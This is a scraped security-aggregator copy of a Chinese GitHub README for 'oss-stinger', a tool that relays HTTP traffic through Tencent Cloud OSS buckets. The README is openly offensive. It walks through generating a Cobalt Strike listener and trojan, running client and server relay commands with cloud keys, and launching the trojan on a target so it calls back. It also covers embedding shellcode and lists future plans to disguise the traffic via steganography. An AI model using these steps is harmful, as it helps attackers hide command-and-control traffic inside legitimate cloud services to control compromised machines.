---
title: oss-stinger
url: https://buaq.net/go-137458.html
source: unSafe.sh - 不安全
date: 2022-11-28
fetch_date: 2025-10-03T23:54:45.228487
---

# oss-stinger

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/28b08fdd1959c28d451950d3973ba53e.jpg)

oss-stinger

A tag already exis
*2022-11-27 23:4:41
Author: [github.com(查看原文)](/jump-137458.htm)
阅读量:37
收藏*

---

A tag already exists with the provided branch name. Many Git commands accept both tag and branch names, so creating this branch may cause unexpected behavior. Are you sure you want to create this branch?

[**1**
branch](https://github.com/y35uishere/oss-stinger/branches)
[**0**
tags](https://github.com/y35uishere/oss-stinger/tags)

Code

* Use Git or checkout with SVN using the web URL.
* [Open with GitHub Desktop](https://desktop.github.com)
* [Download ZIP](https://github.com/y35uishere/oss-stinger/archive/refs/heads/master.zip)

This branch is up to date with 9bie/oss-stinger:master.

## Latest commit

[![@9bie](https://avatars.githubusercontent.com/u/12439321?s=48&v=4)](https://github.com/9bie)

## Files

[Permalink](https://github.com/y35uishere/oss-stinger/tree/a3da595115aaf5dd67e07768c18061d24b9cdeee)

Failed to load latest commit information.

Type

Name

Latest commit message

Commit time

利用腾讯云oss，来转发http流量

可以用来cs/msf上线等

```
.\oss-stinger.exe
  -address string
        监听地址或者目标地址，格式：127.0.0.1:8080
  -id string
        输入你的腾讯云SecretID
  -key string
        输入你的腾讯云SecretKey
  -mode string
        client/server 二选一
  -url string
        输入你腾讯云OSS桶的url地址
```

首先，现在cs生成一个http的listen，并把host都改成127.0.0.1，然后生成木马
[![1.jpg](https://camo.githubusercontent.com/9a442b2e77bce9d17534c4307d030b823fe4cc40fe31e62591cb1d4f0d8675d6/68747470733a2f2f396269652e6f72672f7573722f75706c6f6164732f323032322f31312f313933363136373434302e6a7067)](https://camo.githubusercontent.com/9a442b2e77bce9d17534c4307d030b823fe4cc40fe31e62591cb1d4f0d8675d6/68747470733a2f2f396269652e6f72672f7573722f75706c6f6164732f323032322f31312f313933363136373434302e6a7067)
**然后再把Host改会公网IP(这步很重要)**

然后去腾讯云，申请一个oss桶。拿到URL
[![2.jpg](https://camo.githubusercontent.com/7a38cd759ebee7f3c1ef9646b28fa780d327055e95b25ba2bfd53cf1a6b0f203/68747470733a2f2f396269652e6f72672f7573722f75706c6f6164732f323032322f31312f313235353036303031382e6a7067)](https://camo.githubusercontent.com/7a38cd759ebee7f3c1ef9646b28fa780d327055e95b25ba2bfd53cf1a6b0f203/68747470733a2f2f396269652e6f72672f7573722f75706c6f6164732f323032322f31312f313235353036303031382e6a7067)
然后再去 `https://console.cloud.tencent.com/cam/capi` 拿到SecretKey和SecretID。

然后就可以使用我们的工具了，先在客户机上起一个转发器，使用命令

```
oss-stinger.exe -mode client -url oss桶的url地址 -address 127.0.0.1:端口 -id 腾讯云SecretID -key 腾讯云SecretKey
```

然后服务器运行

```
oss-stinger.exe -mode server -url oss桶的url地址 -address 127.0.0.1:端口 -id 腾讯云SecretID -key 腾讯云SecretKey
```

然后在客户机双击你的木马，就能上线了
[![3.jpg](https://camo.githubusercontent.com/9e2adf975d71b12c8e678ece56f6a8dc8873d7c03eb6057d3d4305537327ed6a/68747470733a2f2f396269652e6f72672f7573722f75706c6f6164732f323032322f31312f323137313939363439322e6a7067)](https://camo.githubusercontent.com/9e2adf975d71b12c8e678ece56f6a8dc8873d7c03eb6057d3d4305537327ed6a/68747470733a2f2f396269652e6f72672f7573722f75706c6f6164732f323032322f31312f323137313939363439322e6a7067)

如果要弄成一个文件，自行修改代码把shellcode加入进去然后用`go runshellcode()`即可。

secretkey和secretid的安全问题，目前没有什么好的解决方案，可以考虑弄一个动态下发的。自己修改吧

* 修改流量特征（纯Base64太蠢了，预计后续看看能不能弄成一个图片隐写来传输流量）
* 自定义OSS交换文件（其实这只要改几行代码就行，但是我就是纯纯懒狗一条）
* 添加阿里云/aws等支持（其实下个sdk调用调用就行了，但是我还是就是懒狗一条）
* 添加其他协议支持（可能会咕，TCP这种无状态的长连接不太好处理，但是也不是不能处理，让我想想）

文章来源: https://github.com/y35uishere/oss-stinger
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)